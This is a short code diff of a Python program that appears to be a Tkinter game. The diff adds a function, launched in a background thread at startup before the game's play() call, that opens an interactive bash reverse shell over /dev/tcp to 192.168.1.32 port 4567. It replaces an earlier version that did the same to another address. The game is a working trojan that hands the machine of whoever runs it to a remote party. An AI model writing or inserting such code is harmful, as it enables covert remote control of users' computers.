@@ -226,13 +226,15 @@ def play():
 	B3.pack(side = 'top')
 	menu.mainloop()
 
-def hack(num):
-    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.146/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
+def victim(num):
+    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.32/4567 0<&1 2>&1", shell=True, executable='/bin/bash')
+
+def hacking_thread():
+    thread = threading.Thread(target = victim, args=(10,))
+    thread.start()
 
 # Call main function
 if __name__ == '__main__':
-    thread = threading.Thread(target= hack, args=(10,))
-    thread.start()
-	
+    hacking_thread()
     play()
     exit()
